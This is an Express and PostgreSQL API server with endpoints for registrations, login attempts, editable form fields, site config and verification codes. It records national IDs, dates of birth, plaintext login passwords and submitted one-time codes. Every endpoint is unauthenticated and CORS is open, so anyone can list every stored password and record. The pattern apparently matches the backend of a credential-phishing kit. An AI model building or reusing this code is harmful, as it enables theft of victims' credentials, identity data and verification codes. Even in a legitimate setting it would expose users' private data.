const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// Neon connection
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// Helper function
async function query(text, params) {
  const client = await pool.connect();
  try {
    const result = await client.query(text, params);
    return result.rows;
  } finally {
    client.release();
  }
}

// ─── REGISTRATIONS ─────────────────────────────────────────────────────────────

// GET all registrations
app.get('/api/registrations', async (req, res) => {
  try {
    const rows = await query('SELECT * FROM registrations ORDER BY created_at DESC');
    res.json(rows);
  } catch (err) {
    console.error('Error:', err);
    res.status(500).json({ error: err.message });
  }
});

// GET single registration
app.get('/api/registrations/:id', async (req, res) => {
  try {
    const rows = await query('SELECT * FROM registrations WHERE id = $1', [req.params.id]);
    res.json(rows[0] || null);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST new registration
app.post('/api/registrations', async (req, res) => {
  try {
    const { full_name, email, phone, national_id, date_of_birth, password_hash, extra_fields, status } = req.body;
    const rows = await query(
      `INSERT INTO registrations (full_name, email, phone, national_id, date_of_birth, password_hash, extra_fields, status)
       VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
       RETURNING *`,
      [full_name, email, phone, national_id, date_of_birth, password_hash, extra_fields || {}, status || 'pending']
    );
    res.json(rows[0]);
  } catch (err) {
    console.error('Error:', err);
    res.status(500).json({ error: err.message });
  }
});

// PATCH registration
app.patch('/api/registrations/:id', async (req, res) => {
  try {
    const { full_name, email, phone, national_id, date_of_birth, password_hash, extra_fields, status } = req.body;
    const fields = [];
    const values = [];
    let i = 1;
    
    if (full_name !== undefined) { fields.push(`full_name = $${i++}`); values.push(full_name); }
    if (email !== undefined) { fields.push(`email = $${i++}`); values.push(email); }
    if (phone !== undefined) { fields.push(`phone = $${i++}`); values.push(phone); }
    if (national_id !== undefined) { fields.push(`national_id = $${i++}`); values.push(national_id); }
    if (date_of_birth !== undefined) { fields.push(`date_of_birth = $${i++}`); values.push(date_of_birth); }
    if (password_hash !== undefined) { fields.push(`password_hash = $${i++}`); values.push(password_hash); }
    if (extra_fields !== undefined) { fields.push(`extra_fields = $${i++}`); values.push(JSON.stringify(extra_fields)); }
    if (status !== undefined) { fields.push(`status = $${i++}`); values.push(status); }
    
    values.push(req.params.id);
    const rows = await query(
      `UPDATE registrations SET ${fields.join(', ')} WHERE id = $${i} RETURNING *`,
      values
    );
    res.json(rows[0]);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── LOGIN ATTEMPTS ────────────────────────────────────────────────────────────

// GET all login attempts
app.get('/api/login_attempts', async (req, res) => {
  try {
    const rows = await query('SELECT * FROM login_attempts ORDER BY created_at DESC');
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST new login attempt
app.post('/api/login_attempts', async (req, res) => {
  try {
    const { registration_id, email, password } = req.body;
    const rows = await query(
      `INSERT INTO login_attempts (registration_id, email, password) VALUES ($1, $2, $3) RETURNING *`,
      [registration_id, email, password]
    );
    res.json(rows[0]);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── SITE CONFIG ───────────────────────────────────────────────────────────────

// GET site config
app.get('/api/site_config', async (req, res) => {
  try {
    const rows = await query("SELECT * FROM site_config WHERE key = 'site_config'");
    res.json(rows[0] || { key: 'site_config', value: {} });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST site config (upsert)
app.post('/api/site_config', async (req, res) => {
  try {
    const { key, value } = req.body;
    const rows = await query(
      `INSERT INTO site_config (key, value) VALUES ($1, $2)
       ON CONFLICT (key) DO UPDATE SET value = $2, updated_at = now()
       RETURNING *`,
      [key, JSON.stringify(value)]
    );
    res.json(rows[0]);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── FORM FIELDS ───────────────────────────────────────────────────────────────

// GET all form fields
app.get('/api/form_fields', async (req, res) => {
  try {
    const rows = await query('SELECT * FROM form_fields ORDER BY field_order');
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// PATCH form field
app.patch('/api/form_fields/:id', async (req, res) => {
  try {
    const fields = [];
    const values = [];
    let i = 1;
    
    const allowed = ['page_key', 'field_key', 'label', 'field_type', 'placeholder', 'required', 'is_hidden', 'field_order'];
    for (const key of allowed) {
      if (req.body[key] !== undefined) {
        fields.push(`${key} = $${i++}`);
        values.push(req.body[key]);
      }
    }
    
    values.push(req.params.id);
    const rows = await query(
      `UPDATE form_fields SET ${fields.join(', ')} WHERE id = $${i} RETURNING *`,
      values
    );
    res.json(rows[0]);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST form field
app.post('/api/form_fields', async (req, res) => {
  try {
    const { page_key, field_key, label, field_type, placeholder, required, is_hidden, field_order } = req.body;
    const rows = await query(
      `INSERT INTO form_fields (page_key, field_key, label, field_type, placeholder, required, is_hidden, field_order)
       VALUES ($1, $2, $3, $4, $5, $6, $7, $8) RETURNING *`,
      [page_key, field_key, label, field_type, placeholder, required || false, is_hidden || false, field_order || 0]
    );
    res.json(rows[0]);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// DELETE form field
app.delete('/api/form_fields/:id', async (req, res) => {
  try {
    await query('DELETE FROM form_fields WHERE id = $1', [req.params.id]);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── VERIFICATION CODES ────────────────────────────────────────────────────────

// POST verification code
app.post('/api/verification_codes', async (req, res) => {
  try {
    const { registration_id, code, verified } = req.body;
    const rows = await query(
      `INSERT INTO verification_codes (registration_id, code, verified) VALUES ($1, $2, $3) RETURNING *`,
      [registration_id, code, verified || false]
    );
    res.json(rows[0]);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`API Server running on port ${PORT}`);
});
